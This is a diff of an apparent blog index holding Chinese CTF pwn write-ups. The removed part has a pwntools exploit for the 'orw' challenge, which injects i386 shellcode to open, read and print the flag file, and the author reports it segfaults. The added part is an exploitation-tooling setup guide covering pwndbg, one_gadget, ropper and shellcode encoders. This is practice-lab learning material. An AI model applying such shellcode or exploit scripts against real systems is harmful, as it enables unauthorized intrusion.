-from pwn import *# r = process(&quot;./orw&quot;)r = process(&#x27;./orw&#x27;)elf = ELF(&#x27;./orw&#x27;)# r = remote(&#x27;node5.buuoj.cn&#x27;,27768)bss_addr = elf.bss()# gdb.attach(r,&#x27;b main&#x27;)# shellcode = shellcraft.open(&#x27;flag&#x27;)# shellcode += shellcraft.read(3, bss_addr, 0x100)# shellcode += shellcraft.write(1, bss_addr, 0x100)shellcode = &quot;&quot;&quot;    mov ebx, 0x67616c66    xor ecx, ecx    xor edx, edx    mov eax, 5    int 0x80    mov ebx,3    mov ecx, 0x804a040    xor edx, edx    mov dh, 0x100 &gt;&gt; 8    mov eax,3    int 0x80    mov ebx, 1    mov ecx,0x804a040    xor edx, edx    mov dh, 0x100 &gt;&gt; 8    mov eax,4    int 0x80&quot;&quot;&quot;print(shellcode)shellcode = asm(shellcode, arch = &#x27;i386&#x27;, os=&#x27;linux&#x27;)r.sendline(shellcode)r.interactive()
-
-但是很可惜的是不知道为什么这道题目没有办法写出来。不管是本地还是远程都有段错误。这个段错误非常的奇怪，不知为何就是解决不了。而且我看别人的视频里面的解法里面也是有段错误的，但是非常奇怪别人可以正常获得flag。
-
-
-
-
-3
-read
-0x03
-unsigned int fd
-char *buf
-size_t count
-
-
-
-4
-write
-0x04
-unsigned int fd
-const char *buf
-size_t count
-
-
-5
-open
-0x05
-const char *filename
-int flags
-umode_t mode
-
-
-以后有时间在解决吧。这个问题。
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>shellcode</tag>
-        <tag>PWN的writeup</tag>
-        <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>shellcode1_dahuan02</title>
     <url>//docx/shellcode1_dahuan02/</url>
     <content><![CDATA[
@@ -2663,6 +2600,69 @@ from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;,
         <tag>shellcode</tag>
         <tag>PWN的writeup</tag>
         <tag>大欢老师の屎题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn基础配置</title>
+    <url>//docx/pwn%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[ubuntu系统和windows系统
+做pwn前需要准备的工具：
+一些虚拟机配置鼠标拖拽控制
+这个服务打开即可
+安装软件linux需要在前面加sudo哈
+网络环境配置默认主机有clash或其他vpn工具。
+
+允许局域网和端口要记住并且打开，系统代理在你需要打开vpn的时候打开即可。
+虚拟机调为NAT连接模式。
+
+在ubuntu的settings中proxy（代理）调整为manual（手动），把http和https的proxy改成相应的URL和Port
+
+端口号就和前面的一样，URL就是vmware给虚拟机的地址，查看方式如图所示： 
+
+基础环境配置python3#首先进入root模式sudo apt updatesudo apt install python3sudo apt install python3-pipalias python=&#x27;/usr/bin/python3&#x27;
+
+一般只需要python3，如果需要python2的话可以看：
+python2环境
+按照这样安装一轮应该就可以了，不要乱删东西。如果不想安装pip可以试下面的第二种办法安装pwntools
+Pwntoolspython库
+sudo pip3 install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple#或者sudo apt install python3-pwntools
+
+Wine用来在linux环境下使用windows程序的…一般而言不需要
+apt-get install wine
+
+Gdb &amp; pwndbg调试程序
+apt install gdbapt install gitgit clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.shvim ~/.gdbinit#进入到vim之后，输入人source [pwndbg的位置]/gdbinit.py#比如:source /home/kanyo/pwndbg/gdbinit.py
+
+One_gadget一种工具，从libc中直接找到一个构造ROP的地址。
+apt install rubyapt install gemgem install one_gadgetpip3 install --break-system-packages ropper #我建议用这个
+
+因为ROPgadget需要用grep管道指令搜索，有点麻烦
+可以直接用ropper来查询
+ropper --file [filename] --search &#x27;[words]&#x27;
+
+LibcSearcher#libcSearcher有时候不会准，这里提供一个网站：#http://libc.blukat.me#下面是libc安装git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearcherpython setup.py develop
+
+main_arena_offset堆题
+https://github.com/bash-c/main_arena_offset#shell脚本，直接下载使用即可，用来搜索堆偏移量的https://github.com/zarkivy/py_main_arena_offset#这个是python包装好的，内核还是上面的shell脚本，不过可以在python里面使用
+
+seccomp-tools用来查被禁用的syscall的
+sudo apt install gcc ruby-dev #依赖sudo gem install seccomp-tools
+
+其他常用apt install vimapt install checksec
+
+IDA Prowindows下直接安装即可
+alpha3.git这个软件是用来shellcode字符化的，但是真的他妈的太难用了。
+看这个吧：alpha3.py
+AE64alpha3对32位的shellcode适配性比较高，不过我们可以试试这个AE64来写64位的题目：
+git clone https://github.com/veritas501/ae64.git --depth 1cd ae64sudo python3 setup.py install
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN攻略-前提</tag>
+        <tag>计算机原理</tag>
       </tags>
   </entry>
   <entry>
